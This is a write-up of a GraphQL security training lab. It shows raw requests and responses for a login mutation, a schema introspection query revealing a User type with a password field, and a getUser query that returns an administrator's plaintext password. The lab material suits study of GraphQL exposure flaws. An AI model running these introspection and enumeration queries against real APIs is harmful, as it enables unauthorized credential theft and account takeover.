
# **WSA-GraphQL-Lab2**

_An #ND-AF / #AuDHD Perspective on GraphQL Introspection & Hidden Data_  
`// Because sometimes the most interesting data is the data they don't think you'll ask for` 🔍🕶️

**AUTHORS:**

- **51n5337** - _The Arghmage_ 🧙‍♂️🔮 | Your nerd bro from the block, that ghost in the grid
    
- **#OG** - _The Unseen Sentinel_ 🏳️‍⚧️⚡ | Silent protocol analyst, pattern breaker, reality debugger
    
- **AFFILIATION:** [`>dr.kb< multiverse-lib`](https://bkornpob.github.io) 🌐📚 | **Where hyperfocus archives collide with reality**
    

**INCIDENT DATE:** [System Time: 2025-11-01]  
**CLASSIFICATION:** `GRAPHQL_UNAUTHORIZED_ENUMERATION` | `CREDENTIAL_EXPOSURE_VIA_INTROSPECTION`  
**VIBE CHECK:** `AUTISTIC_SQUIRREL_FINDING_ALL_THE_NUTS_AT_ONCE` 🐿️🔓📦

---

[...back](../note-1.md)

### keys

*keywords*
```
#q1 
query, mutation login($input: LoginInput!), login(input: $input), token, success, operationName, login, variables, input, username, password

#q2 
query{__schema}
#r2
[only relevant]
User{id,username,password}
```

*key*
> #q1 shows graphql endpoint and query-response
> #q2 query{`__schema`}
> found User{id,username,password}
> use #q3 and delete `carlos`!

---

### q1 POST /graphql/v1

```
#query
{"query":"\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }","operationName":"login","variables":{"input":{"username":"carlos","password":"admin"}}}

---

#response
{
  "data": {
    "login": {
      "token": "tLoubzsgwLi7QEISeQWrE3045qsftutS",
      "success": false
    }
  }
}
```

---

# q2 schema

[from lab1 #q3](./websecacademy-graphql-lab1.md)

```
#query
{
  "query": "query { __schema { types { name fields { name description } } } }"
}

---

#response
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "BlogPost",
          "fields": [
            {
              "name": "id",
              "description": null
            },
            {
              "name": "image",
              "description": null
            },
            {
              "name": "title",
              "description": null
            },
            {
              "name": "author",
              "description": null
            },
            {
              "name": "date",
              "description": null
            },
            {
              "name": "summary",
              "description": null
            },
            {
              "name": "paragraphs",
              "description": null
            }
          ]
        },
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "ChangeEmailInput",
          "fields": null
        },
        {
          "name": "ChangeEmailResponse",
          "fields": [
            {
              "name": "email",
              "description": null
            }
          ]
        },
        {
          "name": "Int",
          "fields": null
        },
        {
          "name": "LoginInput",
          "fields": null
        },
        {
          "name": "LoginResponse",
          "fields": [
            {
              "name": "token",
              "description": null
            },
            {
              "name": "success",
              "description": null
            }
          ]
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "Timestamp",
          "fields": null
        },
        {
          "name": "User",
          "fields": [
            {
              "name": "id",
              "description": null
            },
            {
              "name": "username",
              "description": null
            },
            {
              "name": "password",
              "description": null
            }
          ]
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name",
              "description": "The __Directive type represents a Directive that a server supports."
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "isRepeatable",
              "description": null
            },
            {
              "name": "locations",
              "description": null
            },
            {
              "name": "args",
              "description": null
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "args",
              "description": null
            },
            {
              "name": "type",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "type",
              "description": null
            },
            {
              "name": "defaultValue",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description",
              "description": null
            },
            {
              "name": "types",
              "description": "A list of all types supported by this server."
            },
            {
              "name": "queryType",
              "description": "The type that query operations will be rooted at."
            },
            {
              "name": "mutationType",
              "description": "If this server supports mutation, the type that mutation operations will be rooted at."
            },
            {
              "name": "directives",
              "description": "'A list of all directives supported by this server."
            },
            {
              "name": "subscriptionType",
              "description": "'If this server support subscription, the type that subscription operations will be rooted at."
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind",
              "description": null
            },
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "fields",
              "description": null
            },
            {
              "name": "interfaces",
              "description": null
            },
            {
              "name": "possibleTypes",
              "description": null
            },
            {
              "name": "enumValues",
              "description": null
            },
            {
              "name": "inputFields",
              "description": null
            },
            {
              "name": "ofType",
              "description": null
            },
            {
              "name": "specifiedByURL",
              "description": null
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "mutation",
          "fields": [
            {
              "name": "login",
              "description": null
            },
            {
              "name": "changeEmail",
              "description": null
            }
          ]
        },
        {
          "name": "query",
          "fields": [
            {
              "name": "getBlogPost",
              "description": null
            },
            {
              "name": "getAllBlogPosts",
              "description": null
            },
            {
              "name": "getUser",
              "description": null
            }
          ]
        }
      ]
    }
  }
}
```

---

# q3 id=1 administrator

```
#query
{
  "query": "query { getUser(id: 1) { username password } }"
}

---

#response
{
  "data": {
    "getUser": {
      "username": "administrator",
      "password": "yg0bq3l0i0yikqdkij43"
    }
  }
}
```

---

[...back](../note-1.md)
